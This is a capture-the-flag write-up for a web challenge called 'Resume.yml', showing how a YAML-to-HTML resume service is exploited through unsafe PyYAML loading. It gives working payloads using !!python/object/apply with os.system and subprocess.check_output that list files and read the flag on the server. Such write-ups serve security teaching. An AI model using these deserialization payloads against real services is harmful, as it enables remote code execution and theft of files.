# Resume.yml
* Category: Web
* 150 Points
* Solved by the JCTF Team

## Description
> Writing your resume on word is for rookies.
> 
> Real programmers use yaml.
> 
> I hope I don't have any bugs


## Solution

As the name suggests, the attached website allowed entering a resume formatted in YAML and submitting it to a service which translates it to HTML.

For example, the following YAML structure:

```yaml
profile:
    name: Sebastian Hanula
    label: Software engineer
    email: sebastian.hanula@gmail.com
    phone: +48 693 320 358
    birth: 10-02-1983
    address: Myślenice, Poland
```

Got translated (more or less) to the following HTML structure:

```html
<div class="header">
    <div class="col-md-6 col-sm-12">
        <h1>Sebastian Hanula</h1>
        <h3>Software engineer</h3>
    </div>
</div>

<div class="">
    <div class="col-md-6 col-sm-12">
        <dl class="contacts dl-horizontal">
            <dt>Address:</dt>
            <dd>Myślenice, Poland</dd>

            <dt>Phone:</dt>
            <dd>+48 693 320 358</dd>

            <dt>Email:</dt>
            <dd>
                <a href="mailto:sebastian.hanula@gmail.com">
                    sebastian.hanula@gmail.com
                </a>
            </dd>
        </dl>
    </div>
</div>
```

The obvious next step is to try and understand how to execute code via YAML. A search suggests [PyYAML](https://pyyaml.org/wiki/PyYAMLDocumentation), with syntax such as:

| YAML tag | Python type |
| --- | --- |
| `!!python/name:module.name` | `module.name` |
| `!!python/module:package.module` | `package.module` |
| `!!python/object:module.cls` | `module.cls instance` |
| `!!python/object/new:module.cls` | `module.cls instance` |
| `!!python/object/apply:module.f` | `value of f(...)` |


We can try:

```yaml
profile:
    name: !!python/object/apply:os.system ["ls"]
```

Which just sets the name to `0` (the process return address).

A better choice is:
```yaml
profile:
    name: !!python/object/apply:subprocess.check_output ["ls"]
```

which sets the name to "`b'flag\nmain.py\nrequirements.txt\ntemplates\n'`".

We want the flag, so let's try:

```yaml
profile:
    name: !!python/object/apply:subprocess.check_output [["cat", "flag"]]
```

And we get the flag: `AppSec-IL{1-W4n73D-N1c3-CV-1-907-N1c3-Rc3}`